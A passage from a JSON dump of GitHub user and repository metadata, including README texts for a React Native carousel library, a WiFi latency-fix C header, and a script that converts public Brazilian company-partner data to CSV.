"organization"},"siteAdmin":"false"},{"user":{"login":"kkemple","followers":{"totalCount":150},"repositories":{"totalCount":103},"following":{"totalCount":19},"location":"New Windsor, NY","organizations":{"totalCount":5},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":108},"websiteUrl":"https://twitter.com/kurtiskemple"},"repository":{"name":"react-native-sideswipe","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":false,"forkCount":12,"readme_md":{"text":"# Sideswipe\nA simple, cross-platform React Native swipeable carousel with sensible defaults\n\n![demo1](./example-assets/sideswipe.gif)\n\n![demo2](./example-assets/spaced-tesla.gif)\n\n## Why Another Carousel?\nMost solutions I found were very focused on mobile and adopt a paging pattern which limits what you can do on tablet and when you want the child to page when its smaller than the viewport.\n\nOn top of that most solutions were either one-size-fits-all or not really polished.\n\n## What Makes Your Solution So Special?\nNothing. It's just a tiny simple carousel with a pretty flexible API. If you need more check out another solution, if you need less you might not need a carousel because this whole thing is ~200 lines. 😎\n\n___\n\n## API\n\n### `<Carousel />`\nCarousel component used to render carousel items via `renderItem` prop.\n\n```js\ntype CarouselProps = {\n  // style for the FlatList content container element\n  contentContainerStyle?: Styles,\n\n  // horizontal padding on carousel\n  contentOffset?: number,\n\n  // data for FlatList\n  data: Array<*>,\n\n  // used to set the unique key of each item in the carousel\n  extractKey?: (item: *, index: number) => string,\n\n  // style for the FlatList element\n  flatListStyle?: Styles,\n\n  // active index of the carousel\n  index?: number,\n\n  // width of each child\n  itemWidth?: number,\n\n  // function called when the end of the carousel is reached\n  onEndReached: () => void,\n\n  // number between 0 - 1 used to determine when to call onEndReached\n  onEndReachedThreshold: number,\n\n  // fired when the active index for the carousel changes\n  onIndexChange?: number => void,\n\n  // offset from center of carousel item used for determining index\n  threshold?: number,\n\n  /**\n   * drag distance examples with different thresholds\n   * \n   * with item width of 200 and no threshold\n   * ---------------> <-----------------\n   * 0 ------- -index/+index ------- 200\n   *\n   * with item width of 200 and 50 threshold\n   * ---------->           <------------\n   * 0 -- -index -- 100 -- +index -- 200\n   *\n   * with item width of 200 and 75 threshold\n   * -------->               <----------\n   * 0 - -index --- 100 --- +index - 200\n   *\n   * with item width of 200 and 90 threshold\n   * ----->                      <------ \n   * 0 -index ----- 100 ----- +index 200\n   */\n\n  // render item method, similar to FlatList with some enhancements\n  renderItem: CarouselRenderProps =>\n    | Array<React$Element<*> | boolean>\n    | React$Element<*>\n    | null,\n\n  // should we capture touch event\n  shouldCapture?: GestureState => boolean,\n\n  // should we release touch event to another view\n  shouldRelease?: GestureState => boolean,\n\n  // style for the FlatList element\n  style?: Styles,\n\n  // should we use native driver for animation\n  useNativeDriver?: boolean,\n}\n```\n\n```js\ntype CarouselRenderProps = {\n  // index of item in data collection\n  itemIndex: number,\n\n  // active index of the carousel\n  currentIndex: number,\n\n  // total count of items in data collection\n  itemCount: number,\n\n  // item passed from FlatList\n  item: *,\n\n  // animated value tracking current index\n  animatedValue: Animated.Value\n}\n\n```\n\n___\n\n## Usage:\n\n```bash\nyarn add react-native-sideswipe\n```\n\n```js\nimport { Dimensions } from 'react-native';\nimport SideSwipe from 'react-native-sideswipe';\n\nimport CustomComponent from '...'\nimport data from '...'\n\nexport default class SweetCarousel extends Component {\n  state = {\n    currentIndex: 0,\n  };\n\n  render = () => {\n    // center items on screen\n    const { width } = Dimensions.get('window');\n    const contentOffset = (width - CustomComponent.WIDTH) / 2;\n\n    return (\n      <SideSwipe\n        index={this.state.currentIndex}\n        itemWidth={CustomComponent.WIDTH}\n        style={{ width }}\n        data={data}\n        contentOffset={contentOffset}\n        onIndexChange={index =>\n          this.setState(() => ({ currentIndex: index }))\n        }\n        renderItem={({ itemIndex, currentIndex, item, animatedValue }) => (\n         <CustomComponent\n            {...item}\n            index={itemIndex}\n            currentIndex={currentIndex}\n            animatedValue={animatedValue}\n          />\n        )}\n      />\n    );\n  };\n}\n```\n\n___\n\n## Contributors\n\nThanks goes to these wonderful people ([emoji key](https://github.com/kentcdodds/all-contributors#emoji-key)):\n\n<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->\n<!-- prettier-ignore -->\n| [<img src=\"https://avatars3.githubusercontent.com/u/3629876?v=4\" width=\"100px;\"/><br /><sub><b>Kurtis Kemple</b></sub>](https://twitter.com/kurtiskemple)<br />[💻](https://github.com/kkemple/react-native-sideswipe/commits?author=kkemple \"Code\") [📖](https://github.com/kkemple/react-native-sideswipe/commits?author=kkemple \"Documentation\") | [<img src=\"https://avatars1.githubusercontent.com/u/1714673?v=4\" width=\"100px;\"/><br /><sub><b>Jason Brown</b></sub>](http://browniefed.com)<br />[💻](https://github.com/kkemple/react-native-sideswipe/commits?author=browniefed \"Code\") [🤔](#ideas-browniefed \"Ideas, Planning, & Feedback\") | [<img src=\"https://avatars1.githubusercontent.com/u/16436270?v=4\" width=\"100px;\"/><br /><sub><b>Akshay Kadam</b></sub>](https://twitter.com/deadcoder0904)<br />[📖](https://github.com/kkemple/react-native-sideswipe/commits?author=deadcoder0904 \"Documentation\") | [<img src=\"https://avatars1.githubusercontent.com/u/4272832?v=4\" width=\"100px;\"/><br /><sub><b>Santosh Venkatraman</b></sub>](https://github.com/onstash)<br />[💻](https://github.com/kkemple/react-native-sideswipe/commits?author=onstash \"Code\") | [<img src=\"https://avatars3.githubusercontent.com/u/3153663?v=4\" width=\"100px;\"/><br /><sub><b>Narendra N Shetty</b></sub>](https://twitter.com/narendra_shetty)<br />[🤔](#ideas-narendrashetty \"Ideas, Planning, & Feedback\") | [<img src=\"https://avatars1.githubusercontent.com/u/10658888?v=4\" width=\"100px;\"/><br /><sub><b>Zachary Gibson</b></sub>](https://twitter.com/zacharykeith_)<br />[🤔](#ideas-zachgibson \"Ideas, Planning, & Feedback\") |\n| :---: | :---: | :---: | :---: | :---: | :---: |\n<!-- ALL-CONTRIBUTORS-LIST:END -->\n\nThis project follows the [all-contributors](https://github.com/kentcdodds/all-contributors) specification. Contributions of any kind welcome!\n\n___\n\n## License\nMIT\n","byteSize":6292},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":275},"createdAt":"2018-02-02T19:39:34Z","updatedAt":"2018-02-16T21:21:40Z","pushedAt":"2018-02-15T15:25:12Z","description":"Simple React Native carousel with sensible defaults","subscribersCount":{"totalCount":9},"diskUsage":46152,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":1},"pullRequestsMerged":{"totalCount":15},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":4},"commits":{"totalCount":2}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":5},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":52}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"catid","followers":{"totalCount":123},"repositories":{"totalCount":35},"following":{"totalCount":5},"location":"San Francisco, CA","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":3},"websiteUrl":"https://catid.io"},"repository":{"name":"WLANOptimizer","primaryLanguage":{"name":"C++"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":6,"readme_md":{"text":"# WLANOptimizer\nSingle-header C library that fixes WiFi performance issues for online gaming and other low-latency real-time network traffic.\n\nThis fixes a common issue on Windows laptops where the adapter scans for\nnetworks while a connection is active, causing 100+ millisecond delays.\nThis makes a huge difference in performance for real-time multiplayer!\n\nOn my laptop it reduces the latency from 130 ms delay spikes to 10 ms or less - 10x improvement.\n\nNote: This settings change DOES NOT require Administrator access.\n\nEasy setup:\n\n```\n    Add the include header somewhere:\n\n        #include \"WLANOptimizer.h\"\n\n    Call the start function:\n\n        StartWLANOptimizerThread();\n\n```\n\nAnd that's it.\n\n\n#### Credits\n\nSoftware by Christopher A. Taylor mrcatid@gmail.com\n\nPlease reach out if you need support or would like to collaborate on a project.\n","byteSize":853},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":103},"createdAt":"2018-02-01T07:32:58Z","updatedAt":"2018-02-16T23:03:35Z","pushedAt":"2018-02-08T07:15:17Z","description":"Single-header C library that fixes WiFi performance issues for online gaming and other low-latency real-time network traffic.","subscribersCount":{"totalCount":8},"diskUsage":36,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":17}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"turicas","followers":{"totalCount":745},"repositories":{"totalCount":132},"following":{"totalCount":242},"location":"Curitiba/PR - Brazil","organizations":{"totalCount":4},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":16}}},{"node":{"comments":{"totalCount":8},"stargazers":{"totalCount":20}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":24}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":9}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":4},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}}],"totalCount":79},"websiteUrl":"http://turicas.info/"},"repository":{"name":"socios-brasil","primaryLanguage":{"name":"Python"},"license":"GNU General Public License v3.0","isArchived":false,"hasWikiEnabled":true,"forkCount":17,"readme_md":{"text":"# Sócios de Empresas Brasileiras\n\nScript que baixa todos os dados de sócios das empresas brasileiras [disponíveis\nno site da Receita\nFederal](http://idg.receita.fazenda.gov.br/orientacao/tributaria/cadastros/cadastro-nacional-de-pessoas-juridicas-cnpj/dados-abertos-do-cnpj),\nextrai e converte para CSV. [Veja mais detalhes](http://dados.gov.br/noticia/governo-federal-disponibiliza-os-dados-abertos-do-cadastro-nacional-da-pessoa-juridica).\n\n\n## Dados\n\n**[Acesse diretamente os dados\nconvertidos](https://drive.google.com/open?id=1o2q2FxK9RecbwrhYxlXj25qWJHh2guhi)**\ncaso você não queira/possa rodar o script (esses dados foram baixados e\nconvertidos em 31 de janeiro de 2018). Na pasta \"output\" você encontrará,\ncompactados:\n\n- Um arquivo por unidade federativa;\n- Arquivo `Brasil.csv`, com todos os dados consolidados;\n- Arquivo `socios-brasil.sqlite` - arquivo acima convertido para SQLite, para\n  facilitar consultas.\n\nCada registro dos arquivos acima representa um sócio.\n\nOs dados originalmente estão em um formato [fixed-width\nfile](http://www.softinterface.com/Convert-XLS/Features/Fixed-Width-Text-File-Definition.htm)\ne cada linha possui um tipo diferente de registro (empresa ou sócio), que\ndificulta as análises.\n\nO campo de qualificação do sócio foi definido com base [na tabela\ndisponibilizada pela Receita\nFederal](http://idg.receita.fazenda.gov.br/orientacao/tributaria/cadastros/cadastro-nacional-de-pessoas-juridicas-cnpj/Qualificacao_socio.pdf)\ne está disponível no arquivo\n[`qualificacao-socio.csv`](qualificacao-socio.csv).\n\nSegundo a assessoria de imprensa da Receita Federal do Brasil, a lista de CNPJs\nnão tem ainda registro de todas as empresas do país. A Receita disponibilizou\nsomente os tipos societários que possuem Quadro de Sócios e Administradores.\nAinda segundo o fisco, a lista divulgada tem somente companhias na situação\nCadastral Ativa. Empresas como as MEI e EI, por exemplo, ainda não constam na\nlista.\n\nA pesquisa está atualizada até o dia 15/12/2017, a data consta ao final da\ntabela. A previsão da Receita é atualizar a lista a cada seis meses.\nO órgão informou que **não divulgará CPF dos sócios**. Somente o nome dos\nsócios será fornecido. Caso seja um sócio PJ, será fornecido o número do CNPJ\ndeste \"sócio\" PJ.\n\n> Nota: a codificação de caracteres original é ISO-8859-15, mas o script gera o\n> CSV em UTF-8.\n\n\n### Erros\n\n- Algumas empresas não constam nos arquivos acima, acredito que sejam dados não\n  muito atuais.\n\n\n## Rodando\n\nEsse script depende de Python 3.6 e de algumas bibliotecas. Instale-as\nexecutando:\n\n```bash\npip install -r requirements.txt\n```\n\nVocê deverá rodá-lo em várias etapas:\n\n- Criar o script que baixa os arquivos fix-width\n- Baixar os arquivos\n- Converter os arquivos para cada unidade federativa (gerando CSVs)\n- Juntar os CSVs em um só (para todo o Brasil)\n\nCriando o script que baixa os arquivos:\n\n```bash\npython3 socios.py create-download-script\n```\n\nApós executar, um arquivo `download.sh` será criado. Esse script precisa do\n`wget` instalado (que é o padrão em distribuições GNU/Linux - caso use MacOS,\ninstale-o rodando `brew install wget`). Rode o script para baixar todos os\narquivos de sócios da Receita Federal:\n\n```bash\nsh download.sh\n```\n\nPoderá demorar. Vários arquivos `.txt` serão baixados para o diretório\n`download`.  Converta-os para CSV com o seguinte comando:\n\n```bash\npython3 socios.py convert-all\n```\n\nUm diretório `output` será criado com os CSVs (que estarão com codificação\nUTF-8, separados por vírgula).\n\nCaso queira converter apenas um arquivo, você poderá utilizar o subcomando\n`convert-file`, passando o nome do arquivo de origem e o nome de destino,\nexemplo:\n\n```bash\npython3 socios.py convert-file --input-filename=download/Paraná.txt --output-filename=output/Paraná.csv\n```\n\nPara gerar o `output/Brasil.csv`, execute:\n\n```bash\npython3 socios.py merge-all\n```\n\nPara gerar a base de dados SQLite (facilita consultas), rode o seguinte\ncomando:\n\n```bash\npython3 csv2sqlite.py\n```\n ### Downloads\n\nPrevisão de tamanhos dos arquivos a serem baixados (atualizado em 2018-02-01):\n\n- Acre: 8013978 (7,6 MB)\n- Alagoas: 32437339 (31 MB)\n- Amapá:  8404764 (8,0 MB)\n- Amazonas:  35411591 (34 MB)\n- Bahia: 231116303 (220 MB)\n- Ceará: 104380545 (100 MB)\n- Distrito Federal:  107598131 (103 MB)\n- Espírito Santo: 101900028 (97 MB)\n- Goiás : 181131794 (173 MB)\n- Maranhão: 62187690 (59 MB)\n- Mato Grosso: 77130002 (74 MB)\n- Mato Grosso do Sul: 55749271 (53 MB)\n- Minas Gerais: 549952985 (524 MB)\n- Pará:  82718853 (79 MB)\n- Paraíba: 41613361 (40 MB)\n- Paraná: 401246497 (383 MB)\n- Pernambuco: 124284464 (119 MB)\n- Piauí: 31827285 (30 MB)\n- Rio de Janeiro: 487426461 (465 MB)\n- Rio Grande do Norte: 44115843 (42 MB)\n- Rio Grande do Sul: 385868132 (368 MB)\n- Rondônia: 32882369 (31 MB)\n- Roraima: 6426195 (6,1 MB)\n- Santa Catarina: 281316642 (268 MB)\n- São Paulo: 1588432400 (1,5 GB)\n- Sergipe:  33880344 (32 MB)\n- Tocantins:  27034140 (26 MB)\n\nTotal: 4,8 GB.\n","byteSize":5026},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":132},"createdAt":"2018-02-01T17:43:14Z","updatedAt":"2018-02-16T15:27:34Z","pushedAt":"2018-02-06T20:43:20Z","description":"Captura os dados de sócios das empresas brasileiras na Receita Federal e exporta para um formato legível por humanos","subscribersCount":{"totalCount":14},"diskUsage":29,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":3},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":3},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":16}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},